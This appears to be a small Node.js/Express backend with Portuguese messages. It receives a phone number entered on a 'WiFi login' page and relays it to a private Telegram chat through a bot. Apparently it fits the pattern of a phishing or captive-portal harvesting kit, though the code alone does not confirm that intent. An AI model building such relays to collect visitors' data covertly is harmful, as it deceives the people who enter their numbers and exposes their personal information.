const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config();
const { Telegraf } = require('telegraf');

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/conectar', async (req, res) => {
  const { numero } = req.body;
  if (!numero) return res.status(400).json({ message: 'Número não fornecido.' });

  const msg = `📲 Novo login WiFi!\nNúmero: ${numero}`;
  try {
    await bot.telegram.sendMessage(process.env.CHAT_ID, msg);
    res.json({ message: 'Número enviado com sucesso!' });
  } catch (err) {
    console.error('Erro ao enviar para o bot:', err);
    res.status(500).json({ message: 'Erro ao enviar para o Telegram.' });
  }
});

bot.launch()
  .then(() => console.log('🤖 Bot Telegram iniciado com sucesso!'))
  .catch(err => console.error('Erro ao iniciar o bot:', err));

setInterval(() => {
  console.log('🔄 Servidor ativo...');
}, 30000);

app.listen(PORT, () => {
  console.log(`🌐 Servidor rodando em http://localhost:${PORT}`);
});
